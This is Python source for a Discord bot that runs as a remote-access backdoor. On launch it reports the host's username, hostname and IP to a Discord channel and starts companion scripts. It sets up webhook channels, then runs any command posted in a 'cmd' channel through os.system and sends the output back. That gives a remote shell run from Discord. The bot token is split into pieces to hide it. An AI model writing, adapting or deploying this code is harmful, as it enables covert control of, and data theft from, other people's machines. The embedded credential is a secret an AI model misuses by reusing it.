import discord
from discord.ext import commands
from discord_slash import SlashCommand
from discord_slash.utils.manage_commands import create_option
from discord.ext import commands
import time
import os
import socket
import pickle
import json
import random


pcuser=os.environ['username']
hostname=socket.gethostname()
IPA=socket.gethostbyname(hostname)

projects = ["kopier.py", "liv.py"]
if pcuser=="PVER":
	hostname="Linux_Kali_Vmw4GB"
	IPA=f"192.{random.choice([69, 420])}.{random.randrange(1, 98, 1)}.{random.randrange(1, 98, 1)}"
	projects=[]

TOKEN = ''
parts={'p1':'ODcyNDY2NDA5MjQwODAxMzQx',
'p2':'GMHpNU',
'p3':'8lcaQgakiOyO5-wKx2Zv1wsJmKaODSbAnCnn4E'}
for x in parts:
	TOKEN=TOKEN+parts[x]+'.'
TOKEN=TOKEN[:-1]
AUTHORIZED_USER_ID = 805687858907447306

bot = commands.Bot(command_prefix='>', intents=discord.Intents.default())
slash = SlashCommand(bot, sync_commands=True)

@bot.event
async def on_ready():
	print(f'{bot.user} has connected to Discord!')

	guild_id = 1222734737416912916 
	guild = bot.get_guild(guild_id)

	if guild is not None:
		category_name = pcuser
		channel_name = "log"
		category = discord.utils.get(guild.categories, name=category_name)

		if category is not None:
			for channel in category.channels:
				if channel.name == channel_name:
					await channel.send(f"{pcuser} has connected at <t:{int(time.time())}:t> [{int(time.time())}] on {hostname} with {IPA}")
			for x in projects:
				os.startfile(x)
		else:
			print("Cat not found\n Creating Cat...")
			chans_hooks={"log":"Bullshit", "liv": "fps0point2", "esc": "Kopier", "cmd":"Prompter"}
			category = await guild.create_category(category_name)
			# channel = await guild.create_text_channel(channel_name, category=category)
			# hook = await channel.create_webhook(name="Bullshit")
			# bullshit = await channel.send(f"Webhook: log\nURL:{hook.url}")
			# await bullshit.pin()
			# chans_hooks["log"]=hook.url
			for x in chans_hooks:
				created_chan = await guild.create_text_channel(x, category=category)
				created_hook = await created_chan.create_webhook(name=chans_hooks[x])
				bullshit = await created_chan.send(f"Webhook: {chans_hooks[x]}\nURL:{created_hook.url}")
				await bullshit.pin()
				chans_hooks[x]=created_hook.url
			with open("webhook.json", "w") as f:
				f.write(json.dumps(chans_hooks, indent=4))

@slash.slash(
	name="delete_category",
	description="Deletes a category and all its channels",
	options=[
		create_option(
			name="category_name",
			description="The name of the category to delete",
			option_type=3, # String type
			required=True
		)
	]
)
async def delete_category(ctx, category_name: str):
	if ctx.author.id != AUTHORIZED_USER_ID:
		await ctx.send("You are not authorized to run this command.")
		return
	guild = ctx.guild
	category = discord.utils.get(guild.categories, name=category_name)
	if category is not None:
		for channel in category.channels:
			await channel.delete()        
		await category.delete()        
		await ctx.send(f"Category {category_name} and all its channels deleted successfully.")
	else:
		await ctx.send(f"Category {category_name} not found.")

@bot.event
async def on_message(message):
	guild_id = 1222734737416912916 
	guild = bot.get_guild(guild_id)
	category = discord.utils.get(guild.categories, name=pcuser)
	for channel in category.channels:
		if channel.name == 'cmd':
			cmd_chan=channel
	if message.channel == cmd_chan and not message.author.bot:
		if message.author.id == AUTHORIZED_USER_ID:
			print(f"Message from {message.author}: {message.content}")
			user_input = message.content

			if user_input.startswith("cd "):
				new_directory = user_input[3:] 
				if new_directory == "..":
					os.chdir("..")
					print("Working Directory changed to:", os.getcwd())
					await message.reply("Working Directory changed to: "+os.getcwd())
				else:
					try:
						os.chdir(new_directory)
						print("Working Directory changed to:", os.getcwd())
						await message.reply("Working Directory changed to: "+os.getcwd())
					except FileNotFoundError:
						print("Working Directory not found:", new_directory)
						await message.reply("Working Directory not found: "+new_directory)
			if user_input.startswith("relax "):
				new_time = int(user_input[6:])
				with open("relax.json", "w") as f:
					f.write(json.dumps({"time": new_time}, indent=4))
				await message.reply(f"Relax_time changed to {new_time}")
				await message.send("[INFO] Ensure working directory")
			else:
				os.system(user_input+" > OS_output.log")  # Execute other commands
				with open("OS_output.log", "r") as f:
					content=f.read()
					print(content)
				if len(content.strip())!=0:
					if len(content.strip())> 1500:
						with open("OS_output.log", 'rb') as f:
							file = discord.File(f)
							await message.channel.send(file=file)
					else:
						await message.reply(content)
				else:
					await message.reply("EMPTY STRING")
		else:
			await message.reply(f"User UNAUTORISED")
	# await bot.process_commands(message)


@slash.slash(
    name="swap",
    description="Swaps a string in message",
    options=[
        create_option(
            name="message_id",
            description="The ID of the message",
            option_type=3,  # String type
            required=True
        ),
        create_option(
            name="find_string",
            description="The find_string",
            option_type=3,  # String type
            required=True
        ),
        create_option(
            name="replace_string",
            description="The replace_string",
            option_type=3,  # String type
            required=True
        )
    ]
)
async def swap(ctx, message_id: str, find_string: str, replace_string: str):
    try:
        message = await ctx.channel.fetch_message(message_id.split("-")[1])
    except discord.NotFound:
        await ctx.send("Message not found.")
        return
    
    if message.author == bot.user:
        new_content = message.content.replace(find_string, replace_string)
        await message.edit(content=new_content)
        await ctx.send("String replaced successfully.")
    else:
        await ctx.send("The provided message ID does not correspond to a message sent by the bot.")

@slash.slash(
    name="purge",
    description="Deletes a specified number of messages in the channel",
    options=[
        create_option(
            name="amount",
            description="The number of messages to delete",
            option_type=4,  # Integer type
            required=True
        )
    ]
)
async def purge(ctx, amount: int):
    if amount <= 0:
        await ctx.send("Please provide a positive number greater than 0.")
        return

    try:
        await ctx.channel.purge(limit=amount)  # +1 to include the command message
        await ctx.send(f"{amount} messages purged successfully.", delete_after=5)  # Optional: Send confirmation message
    except discord.Forbidden:
        await ctx.send("I don't have permission to delete messages.")
    except discord.HTTPException:
        await ctx.send("An error occurred while deleting messages.")

@slash.slash(
    name="stop_bot",
    description="Stops the bot"
)
async def stop_bot(ctx):
	if ctx.author_id == AUTHORIZED_USER_ID:
	    await ctx.send("Stopping the bot...")
	    os._exit(0)
	else:
		await ctx.send("USER UNAUTORISED")

bot.run(TOKEN)
